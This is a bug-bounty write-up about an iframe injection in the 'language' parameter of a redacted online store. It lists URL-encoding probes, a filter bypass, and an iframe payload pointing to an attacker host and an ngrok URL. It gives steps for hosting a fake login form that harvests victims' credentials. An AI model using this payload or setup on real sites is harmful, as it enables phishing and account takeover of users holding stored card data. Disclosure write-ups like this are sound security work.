[![Twitter](https://img.shields.io/badge/twitter%20-%231DA1F2.svg?&style=for-the-badge&logo=Twitter&logoColor=white&label=Follow%20%40xbforce)](https://twitter.com/xbforce)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
[![Youtube](https://img.shields.io/badge/Youtube%20-%23FF0000.svg?&style=for-the-badge&logo=YouTube&logoColor=white&label=Subscribe)](http://www.youtube.com/channel/UCadRCMA7BFJ2iwiABKqf0Fg?sub_confirmation=1)


## Account Takeover via iFrame Injection

```
Vulnerable URL: https://store.redacted.com/
Vulnerable Parameter: language=
```

Sometimes you find an XSS vulnerability on a target domain but you cannot inject your javascript codes because the target sanitizes payloads perfectly using black/white lists or stop them from doing their malicious jobs by using WAFs, but there are always different ways to bypass defending mechanisms, and it is only the matter of time and efforts.

Some months ago I was looking for bugs on a very big company’s subdomains, and found nothing after trying different techniques to takeover accounts for four days. Usually if there is a login system and I can signup on the target website I go for account takeover first. I did the same on this target but I wasn’t able to find any way to takeover accounts simply because the company’s security team did its job really great to block all ways to takeover accounts.

After trying account takeover I decided to look for XSS so maybe I can takeover accounts indirectly via an XSS vulnerability. When I work on a target I always run burpsuite first and capture all traffic with this amazing tool. If I need parameters I go to ```Target``` TAB and on the ```Sitemap``` TAB I look at ```Contents``` section, then prioritize URLs based on ```Params```. This is because burpsuite scanner finds some URLs with parameters and if you are only looking for URLs on the ```history``` TAB you may miss some golden ones.

So I tested URLs and tried different techniques manually to get an XSS, but there wasn’t any success. Finally I picked another address which looked like this:

```
https://store.redacted.com/some/dir/store/index.jsp?c=subscribe
```

I changed the value of the above parameter but nothing reflected on the response page. I noticed that other subdomains have a common parameter in their addresses which is ```language=```, however I wasn’t able to get XSS from this parameter on the other subdomains but I decided to give it a try and add this parameter to the targeted URL:

```
https://store.redacted.com/some/dir/store/index.jsp?language=PAYLOADS&c=subscribe
```


**How did I bypass the restrictions?**

I Hardly ever throw ```ready to use payloads``` to my targets, instead, I try to bypass special characters manually by using different characters and different techniques and make a note of them if characters make any change to the special characters or the URL in total:

```
?language=%25%322

?language=%%32%32

?language=%%2522

?language=%00%25%00%32%00%32

?language=%21%22%3c

?language=%40%22%3c

?language=%5c%22%3c

etc
```


After trying many characters I finally found the golden char which was ```%7b``` which is an open curly bracket ```{```.

```
https://store.redacted.com/some/dir/store/index.jsp?language=%7b%22%3exbforce&c=subscribe
```

![response](https://github.com/xbforce/Blog/blob/main/images/account-takeover-via-iframe-injection/02-escape.png)

<br />
<br />

![escape-url](https://github.com/xbforce/Blog/blob/main/images/account-takeover-via-iframe-injection/03-escape_url.png)





On some targets you are done when you bypass restrictions and you can inject your payload and execute it easly, but on some other targets like the one that I worked on, it is just the first step of struggles and you have to find a way to bypass other restrictions too.

I injected different javascript and html tags and events but all of them were blocked and I couldn’t execute any XSS payload except ```iframe``` and ```src``` (only if it is inside the iframe tag). Next step was trying to cover the original page with my iframe and its contents, but unfortunately it wasn’t possible and I don’t know why the different values on ```position=```, ```width=``` and ```height=``` didn’t work. The only effective values that worked for me were:

```
{“><iframe src="https://attacker-server.com/" position="fixed" width="100%" height="100%"></iframe>
```



This way I could make a banner at the top of the vulnerable page and show something like login or credit card forms there.

As the website allowed its customers to save their credit card info in their accounts and of course the accounts contained Private Information of the users like ```email address, phone number, home address, credit card info etc```, I decided to create a form with a deceitful gift within the iframe to show that I can capture the victims’ credentials.

![login-form](https://github.com/xbforce/Blog/blob/main/images/account-takeover-via-iframe-injection/04-login-method1.png)

I also created another page to redirect the victims after submitting the form so that victims get the unfortunate message.

![unfortunate-message](https://github.com/xbforce/Blog/blob/main/images/account-takeover-via-iframe-injection/05-unfortune-method1.png)

Finally to show how the vulnerability can be exploited I ran my tools and recorded a POC video as well as writing a report containing screenshots.

**Tools**

Ngrok – An easy to use server
Python SimpleHTTPServer.

**Steps to reproduce the exploit**

- Create an index.html file with a form to get username and password of the victim, and redirect them to ```done.html```.
- Create another file named ```done.html``` to show the unfortunate message.
- Make a directory and copy the ```index.html```, ```done.html``` and the ```logo``` file of the target to the directory.

- Run both tools in the same directory where the files are located.

```$ ngrok http 58700```

```$ python -m SimpleHTTPServer 58700```

! Both tools should have the same port number !

- Open the malicious URL as a victim and submit the form.

```
https://store.redacted.com/some/dir/store/index.jsp?language={"><iframe src="https://83c2c8cabcbd.ngrok.io/" position="fixed" width="100%" height="100%" width="inherit" height="inherit" margin="-5" padding="-5"></iframe>&c=subscribe
```

- Check the captured credentials in python SimpleHTTPServer:

![credentials](https://github.com/xbforce/Blog/blob/main/images/account-takeover-via-iframe-injection/06-creds-method1.png)

